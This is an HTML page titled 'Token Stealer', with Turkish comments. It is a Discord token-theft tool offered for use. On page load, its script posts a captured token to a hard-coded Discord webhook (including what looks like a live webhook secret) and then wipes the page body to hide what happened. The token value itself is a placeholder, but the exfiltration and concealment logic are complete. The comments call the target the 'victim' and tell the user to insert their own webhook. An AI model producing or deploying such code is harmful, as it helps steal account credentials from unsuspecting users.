<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Stealer</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white; /* Ekran bembeyaz */
            overflow: hidden; /* Gereksiz kaydırmaları önler */
            font-family: sans-serif;
        }
    </style>
</head>
<body>

    <script>
        // --- AYARLAR ---
        const webhookURL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd"; // Kendi webhook linkini buraya yapıştır

        async function stealToken() {
            // Kurbanun tokenini belirleyen temel yapı (Dinamik hale getirilmiş)
            const token = "Kullanıcı_Tokeni_Buraya"; // Eğer API kullanmıyorsan, bu değer JS ile belirlenir

            const payload = {
                username: "Token Avcısı", 
                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png", 
                content: `**Yeni Token Çalındı!**`, // Ana başlık
                embeds: [{ 
                    "title": "Token Bilgileri", 
                    "description": `**TOKEN:** \`${token}\``, // Token burada bağımsız ve net!
                    "color": 5814783 // Discord Mavisi (Decimal)
                }] 
            };

            // Webhook'a gönderim işlemi (Fetch API)
            await fetch(webhookURL, { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify(payload) 
            });

            // EKRANI BOŞALTMA OPERASYONU: 
            // Sayfa yüklendiğinde içinde yazı varsa bile, işlem bitince hepsini siler.
            document.body.innerHTML = ""; 
        }

        // Sayfa tamamen yüklendiği an token çalma işlemi başlar. (PC & Mobil uyumlu)
        window.onload = stealToken;
    </script>

</body>
</html>
